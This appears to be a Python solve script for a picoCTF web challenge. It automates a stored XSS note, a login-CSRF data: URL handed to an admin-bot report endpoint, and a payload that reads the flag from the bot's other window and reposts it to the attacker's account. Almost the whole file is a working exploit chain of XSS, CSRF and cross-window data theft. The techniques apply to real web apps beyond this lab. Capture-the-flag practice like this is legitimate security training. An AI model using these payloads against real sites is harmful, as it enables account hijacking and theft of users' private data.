import requests
import re
import time

url = "http://saturn.picoctf.net:62843"

s = requests.Session()

creds = {
    'username': 'test',
    'password': 'test'
}

# register and login
s.post(f'{url}/register', data=creds)

res = s.post(f'{url}/login', data=creds)

if "new" in res.text.lower():
    print("> Logged in")

# get csrf token
res = s.get(f'{url}/new')

csrf = re.findall(r'"_csrf" value="(.+)"', res.text)[0]

# xss
payload = '''
<script>
    if (location.href.includes('xss')) {
        fetch('http://0.0.0.0:8080/new').then(res => res.text()).then(page => page.match(/_csrf" value="(.+)"/)[1])
            .then(csrf =>
                fetch('http://0.0.0.0:8080/new', { 
                    'method': 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({
                        'title': 'flag',
                        'content': window.open('', 'hacked').document.body.textContent.match(/(picoCTF{.+})/)[1],
                        '_csrf': csrf
                    })
                })
            )
    }
</script>
'''.strip()

res = s.post(f"{url}/new", data={
    'title': '',
    'content': payload,
    "_csrf": csrf
})

if "new" in res.text.lower():
    print("> XSS note created")

# exfil
payload = f'''
data:text/html,
<form method='POST' action='http://0.0.0.0:8080/login' target='_blank'>
    <input name='username' value='{creds["username"]}'><input name='password' value='{creds["password"]}'>
</form>
<script>
    window.open('http://0.0.0.0:8080/notes', 'hacked')
    setTimeout(() => document.querySelector('form').submit(), 1000)
    setTimeout(() => location.href='http://0.0.0.0:8080/notes?xss', 1500)
</script>
'''.strip()

res = s.post(f"{url}/report", data={ "url": payload, "_csrf": csrf })

if "url" in res.text.lower():
    print("> URL reported")

# fetch flag
while True:
    res = s.get(f'{url}/notes')

    matches = re.findall(r'<p>(picoCTF{.+})</p>', res.text)

    if len(matches) > 0:
        print("Flag:", matches[0])
        break

    time.sleep(1)